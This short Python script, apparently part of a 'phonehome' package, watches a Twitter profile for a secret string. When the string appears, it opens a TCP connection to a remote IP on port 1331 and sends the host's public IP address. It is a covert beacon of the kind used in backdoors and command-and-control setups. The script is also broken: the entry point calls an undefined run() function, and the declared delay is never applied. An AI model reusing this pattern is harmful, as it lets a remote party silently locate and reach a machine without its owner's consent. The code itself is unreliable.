import requests
import time
from phonehome.ip_tools import get_public_ip
import socket

def send_ip(dest_ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((dest_ip, port))

    source_ip = get_public_ip()
    payload = bytearray(source_ip, 'utf8')
    sock.send(payload)

def check_url(link, secret):
    page = requests.get(link)

    if secret in page.text:
        return True
    else:
        return False

def throw_bottle(secret, dest_ip):
    link =  "https://twitter.com/DylanMCromer"
    delay = 10
    port = 1331

    while True:
        if not check_url(link, secret):
            print("Flare not lit. Will not send the message in a bottle")
        else:
            send_ip(dest_ip, port)
            break


if __name__ == "__main__":
    run("KJHVJCYKUGJGFXCYUFTY")
